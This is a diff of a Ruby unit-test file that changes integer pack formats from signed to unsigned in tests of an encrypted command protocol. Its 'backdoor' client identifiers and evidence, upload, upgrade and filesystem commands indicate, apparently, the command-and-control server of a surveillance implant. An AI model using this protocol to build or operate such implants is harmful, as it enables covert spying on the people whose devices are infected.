@@ -100,8 +100,8 @@ class TestProtocol < Test::Unit::TestCase
     cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
 
     # prepare the command
-    message = [Commands::PROTO_ID].pack('i')
-    message += [2011010101].pack('i')
+    message = [Commands::PROTO_ID].pack('I')
+    message += [2011010101].pack('I')
     message += "backdoor.userid".pascalize + "backdoor.deviceid".pascalize + "backdoor.sourceid".pascalize
     enc = aes_encrypt_integrity(message, key)
 
@@ -112,7 +112,7 @@ class TestProtocol < Test::Unit::TestCase
 
     assert_nothing_raised do
       resp = aes_decrypt_integrity(content, key)
-      command, tot, time, size, *list = resp.unpack('i2qi*')
+      command, tot, time, size, *list = resp.unpack('I2qI*')
       assert_equal Commands::PROTO_OK, command
     end
   end
@@ -126,7 +126,7 @@ class TestProtocol < Test::Unit::TestCase
     assert_true Protocol.valid_authentication('test-peer', cookie)
 
     # prepare the command
-    message = [Commands::PROTO_BYE].pack('i')
+    message = [Commands::PROTO_BYE].pack('I')
     enc = aes_encrypt_integrity(message, key)
 
     content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
@@ -136,7 +136,7 @@ class TestProtocol < Test::Unit::TestCase
 
     assert_nothing_raised do
       resp = aes_decrypt_integrity(content, key)
-      command = resp.unpack('i').first
+      command = resp.unpack('I').first
       assert_equal Commands::PROTO_OK, command
     end
 
@@ -153,7 +153,7 @@ class TestProtocol < Test::Unit::TestCase
     commands = [Commands::PROTO_CONF, Commands::PROTO_UPLOAD, Commands::PROTO_UPGRADE, Commands::PROTO_DOWNLOAD, Commands::PROTO_FILESYSTEM]
 
     commands.each do |cmd|
-      message = [cmd].pack('i')
+      message = [cmd].pack('I')
       enc = aes_encrypt_integrity(message, key)
       content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
       assert_nil rcookie
@@ -170,7 +170,7 @@ class TestProtocol < Test::Unit::TestCase
     cookie = SessionManager.instance.create(0, "test-build", "test-instance", "test-subtype", key)
 
     evidence = 'test-evidence'
-    message = [Commands::PROTO_EVIDENCE].pack('i') + [evidence.length].pack('i') + evidence
+    message = [Commands::PROTO_EVIDENCE].pack('I') + [evidence.length].pack('I') + evidence
 
     enc = aes_encrypt_integrity(message, key)
     content, type, rcookie = Protocol.commands('test-peer', cookie, enc)
